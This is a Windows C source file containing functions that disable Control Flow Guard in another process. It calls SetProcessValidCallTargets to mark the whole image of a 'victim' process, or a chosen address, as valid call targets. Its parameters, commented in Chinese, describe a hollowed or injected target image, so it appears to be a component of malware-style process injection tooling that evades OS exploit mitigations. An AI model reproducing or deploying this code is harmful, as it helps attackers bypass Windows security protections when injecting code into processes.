#include "cfg.h"

int GetFunctionAddressFromDll(PSTR pszDllName,PSTR pszFunctionName,PVOID* ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID   pvFunctionAddress = NULL;
	int eReturn = -1;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		eReturn = -10;
		goto lblCleanup;
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		eReturn = -20;
		goto lblCleanup;
	}
	*ppvFunctionAddress = pvFunctionAddress;
	eReturn = 0;

lblCleanup:
	return eReturn;

}

// 目标进程，目标SizeOfImage大小，目标新基址，section大小，section地址
BOOL DisableCfg(PROCESS_INFORMATION pProcessInfo, DWORD victim_size, PVOID victim_base_addr, DWORD cfg_size, PVOID cfg_base) {

	_SetProcessValidCallTargets	pfnSetProcessValidCallTargets = NULL;
	GetFunctionAddressFromDll((PSTR)"kernelbase.dll",(PSTR)"SetProcessValidCallTargets",(PVOID*)&pfnSetProcessValidCallTargets);
	if (pfnSetProcessValidCallTargets == NULL) {
		return FALSE;
	}
	
	for (unsigned long long i = 0; (i + 15) < victim_size; i += 16) {
		CFG_CALL_TARGET_INFO tCfgCallTargetInfo = { 0 };
		tCfgCallTargetInfo.Flags = 0x00000001;
		tCfgCallTargetInfo.Offset = (ULONG_PTR)cfg_base - (ULONG_PTR)victim_base_addr + (ULONG_PTR)i;
		pfnSetProcessValidCallTargets(pProcessInfo.hProcess, victim_base_addr, (size_t)victim_size, (ULONG)1, &tCfgCallTargetInfo);
	}
	return TRUE;
}


BOOL markCFGValid_std(PROCESS_INFORMATION pProcessInfo,PVOID pAddress)
{

	CFG_CALL_TARGET_INFO OffsetInformation = { 0 };
	MEMORY_BASIC_INFORMATION mbi;
	MyNtQueryVirtualMemory pNtQueryVirtualMemory = (MyNtQueryVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)"NtQueryVirtualMemory");

	//Get necessary information about the target memory location
	NTSTATUS status = pNtQueryVirtualMemory(pProcessInfo.hProcess, pAddress, MemoryBasicInformation, &mbi, sizeof(mbi), 0);


	//Can't call SetProcessValidCallTargets on memory that doesn't meet these criteria
	if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE)
	{
		return FALSE;
	}
	//Get the offset in the dll to the target address
	OffsetInformation.Offset = (ULONG_PTR)pAddress - (ULONG_PTR)mbi.BaseAddress;
	//Set memory to a valid call target
	OffsetInformation.Flags = CFG_CALL_TARGET_VALID;
	BOOL success = SetProcessValidCallTargets(pProcessInfo.hProcess, mbi.BaseAddress, mbi.RegionSize, 1, &OffsetInformation);
	if (!success)
	{
		//CFG not enabled on process
		if (87 == GetLastError())
			success = TRUE;
	}

	return success;
}